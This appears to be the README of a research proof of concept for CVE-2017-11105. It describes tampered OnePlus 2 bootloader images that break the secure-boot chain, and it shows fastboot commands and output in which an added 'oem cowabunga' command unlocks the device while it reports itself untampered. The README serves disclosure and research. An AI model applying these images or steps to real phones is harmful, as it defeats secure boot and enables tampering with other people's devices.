## PoC for CVE-2017-11105: OnePlus 2 Lack of SBL1 Validation Broken Secure Boot ##

By Roee Hay / Aleph Research


`sbl1-3.5.8-tampered.mbn`: Tampered SBL1 image that does not validate the rest of the chain
`emmc_appsboot.mbn`: Tampered ABOOT image that includes a new command `oem cowabunga`, that temporarily unlocks the device.

Flashing these will give you some pizza:

```
$ fastboot oem device-info 2>&1 | grep Device
(bootloader)    Device tampered: true
(bootloader)    Device unlocked: false
(bootloader)    Device is_verified: false

$ fastboot oem cowabunga
...
FAILED (remote: pizza)
finished. total time: 0.020s

$ fastboot oem device-info 2>&1 | grep Device
(bootloader)    Device tampered: false
(bootloader)    Device unlocked: true
(bootloader)    Device is_verified: false
```

Verified on OxygenOS 3.6.0.
